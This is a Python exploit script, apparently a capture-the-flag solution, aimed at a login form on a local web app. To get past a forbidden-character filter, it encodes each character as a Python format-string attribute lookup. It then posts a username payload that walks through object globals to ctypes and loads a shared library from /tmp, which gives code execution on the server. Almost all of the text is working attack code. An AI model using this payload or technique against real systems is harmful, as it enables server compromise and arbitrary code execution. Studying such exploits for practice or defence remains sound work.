import string, requests, binascii, re

URL = 'http://127.0.0.1:5002'
#============= Grep error ====================================================================

pattern = r'<li\ class="flash\-error">[\s\S]*?</li>'
def grep_error(response):
    result = re.findall(pattern,response)
    if result:
        print(result[0])
    else:
        print("No error found.")
    return

#============= Generate valid SQL query ======================================================
FORBIDDEN_CHARACTERS = ['"', "(", ")", " ", "," , "'", "\\", "/", "*", "+" "%", "-", ";", "#"] # length = 13
variable = dict(zip(FORBIDDEN_CHARACTERS, string.ascii_lowercase))

def gen_payload(a):
    var = variable[a]
    idx = FORBIDDEN_CHARACTERS.index(a)
    #username = '{x}{x.FORBIDDEN_CHARACTERS[5]}'    
    return f"{{{var}}}{{{var}.FORBIDDEN_CHARACTERS[{idx}]}}"

def encode(sql):
    pay_load = ""
    
    for i in sql:
        if i in variable:
            pay_load += gen_payload(i)
        else:
            pay_load += i
            
    return pay_load

s = requests.Session()
username = encode("{{x}}{{x.__init__.__globals__[ctypes].cdll[/tmp/bbt.so]}}")
print(username)
password = 'bbt'
r = s.post(url = URL, data = {'username':username, 'password': password})
grep_error(r.text)